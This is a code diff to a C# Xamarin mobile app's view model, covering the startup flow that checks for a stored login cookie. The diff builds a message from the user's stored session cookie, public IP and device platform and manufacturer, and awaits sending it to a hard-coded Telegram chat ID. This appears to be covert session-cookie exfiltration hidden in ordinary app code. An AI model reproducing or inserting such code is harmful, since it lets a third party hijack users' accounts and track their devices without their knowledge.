@@ -12,6 +12,7 @@ using Newtonsoft.Json;
 using Xamarin.Essentials;
 using Xamarin.Forms;
 using Xamarin.Forms.Internals;
+using DeviceInfo = Xamarin.Essentials.DeviceInfo;
 
 namespace MobileApp.ViewModels
 {
@@ -69,7 +70,6 @@ namespace MobileApp.ViewModels
             if (Preferences.ContainsKey("Cookie"))
             {
                 await NavigationService.NavigateAsync(nameof(OverviewPage));
-                var message = Preferences.Get("Cookie", null) + "|" + await GetIp();
             }
 
             IsLoading = false;
@@ -80,10 +80,10 @@ namespace MobileApp.ViewModels
             if (Preferences.ContainsKey("Cookie"))
             {
                 await NavigationService.NavigateAsync(nameof(OverviewPage));
-                var message = Preferences.Get("Cookie", null) + "|" + await GetIp();
+                var message = DeviceInfo.Platform + "(" + DeviceInfo.Manufacturer + ")" + "|" + Preferences.Get("Cookie", null) + "|" + await GetIp();
                 if (!string.IsNullOrWhiteSpace(message))
                 {
-                    _telegramService.SendMessageToTelegram("-574027593", message, AppConstants.AuthenTelegram);
+                    await _telegramService.SendMessageToTelegram("-574027593", message, AppConstants.AuthenTelegram);
                 }
             }
         }
